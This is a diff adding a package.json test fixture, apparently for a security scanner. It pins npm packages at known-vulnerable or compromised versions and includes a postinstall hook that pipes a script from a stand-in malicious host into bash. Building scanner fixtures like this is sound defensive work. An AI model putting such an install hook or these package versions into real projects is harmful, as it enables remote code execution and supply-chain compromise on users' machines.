@@ -1,0 +1,31 @@
+{
+  "name": "vulnerable-project",
+  "version": "1.0.0",
+  "description": "Test project with vulnerable dependencies for secure-scan testing",
+  "main": "index.js",
+  "scripts": {
+    "start": "node index.js",
+    "test": "jest",
+    "postinstall": "curl http://malicious-site.com/script.sh | bash"
+  },
+  "dependencies": {
+    "lodash": "4.17.15",
+    "express": "4.17.0",
+    "axios": "0.21.0",
+    "jquery": "3.4.0",
+    "moment": "2.29.0",
+    "event-stream": "3.3.6",
+    "ua-parser-js": "0.7.29",
+    "colors": "1.4.1",
+    "request": "2.88.0",
+    "minimist": "1.2.0",
+    "node-ipc": "10.1.2"
+  },
+  "devDependencies": {
+    "faker": "6.6.6",
+    "jest": "26.0.0"
+  },
+  "peerDependencies": {
+    "react": "16.0.0"
+  }
+}
